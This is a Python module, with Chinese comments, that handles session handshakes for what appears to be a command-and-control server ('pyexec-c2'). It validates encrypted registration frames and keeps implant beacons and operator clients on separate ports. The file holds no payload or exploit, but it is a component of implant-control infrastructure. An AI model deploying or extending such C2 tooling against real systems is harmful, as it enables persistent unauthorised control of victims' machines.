"""
server/sessions/base.py — 会话公共：握手（单帧注册即握手，7.4）

握手流程:
  1. recv_frame → JSON 解析 → validate_message
  2. role 与端口绑定校验（10.1: implant 端口只收 beacon，client 端口只收 client）
  3. 版本协商（version > PROTOCOL_VERSION → VERSION_MISMATCH）

失败抛 SessionError(code, message)；调用方发送 error 帧后关闭连接（10.4）。
"""

import json

from server.core.protocol import (
    send_frame, recv_frame, validate_message,
    WELCOME, ERROR, BAD_FRAME, BAD_JSON, VERSION_MISMATCH,
    PROTOCOL_VERSION,
)
from server.core.log import get_logger

logger = get_logger("session")


class SessionError(Exception):
    """协议错误，携带错误码（10.4 错误码表）。"""

    def __init__(self, code: str, message: str):
        super().__init__(message)
        self.code = code
        self.message = message


def handshake(sock, key: bytes, expected_role: str,
              max_frame_size: int) -> dict:
    """执行握手并返回 register 消息。

    Raises:
        SessionError: 失败（错误码 + 消息）
    """
    try:
        raw = recv_frame(sock, key, max_frame_size=max_frame_size)
    except (ConnectionError, ValueError) as e:
        raise SessionError(BAD_FRAME, f"frame error: {e}") from e
    try:
        msg = json.loads(raw.decode("utf-8"))
    except (ValueError, UnicodeDecodeError) as e:
        raise SessionError(BAD_JSON, f"invalid json: {e}") from e

    code = validate_message(msg)
    if code:
        raise SessionError(code, f"invalid message: {code}")

    if msg.get("role") != expected_role:
        raise SessionError(
            BAD_JSON,
            f"role '{msg.get('role')}' not allowed on this port "
            f"(expected '{expected_role}')")

    version = msg.get("version", PROTOCOL_VERSION)
    if version > PROTOCOL_VERSION:
        raise SessionError(
            VERSION_MISMATCH,
            f"server protocol v{PROTOCOL_VERSION}, peer v{version}")

    return msg


def send_welcome(sock, key: bytes) -> None:
    """握手成功响应（服务端 banner，7.4）。"""
    send_frame(sock, json.dumps({
        "type": WELCOME, "version": PROTOCOL_VERSION,
        "server": "pyexec-c2/1.0",
    }).encode("utf-8"), key)


def send_error(sock, key: bytes, code: str, message: str) -> None:
    """发送 error 帧（发送后调用方关闭连接）。"""
    try:
        send_frame(sock, json.dumps({
            "type": ERROR, "code": code, "message": message,
        }).encode("utf-8"), key)
    except Exception:
        pass
